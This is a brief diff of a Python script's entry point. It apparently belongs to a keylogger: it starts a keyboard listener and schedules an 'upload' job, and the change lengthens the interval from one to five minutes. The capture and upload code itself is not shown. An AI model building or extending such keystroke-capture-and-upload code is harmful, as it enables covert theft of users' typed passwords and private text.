@@ -162,11 +162,10 @@ def upload():
 
 
 if __name__ == '__main__':
-    print("WE ARE WORKING")
     listener = Listener(on_press=on_press)
     listener.start()
     scheduler = BlockingScheduler()
-    scheduler.add_job(upload, 'interval', minutes=1)     # minutes=1 to test
+    scheduler.add_job(upload, 'interval', minutes=5)     # minutes=1 to test
     scheduler.start()
     
 
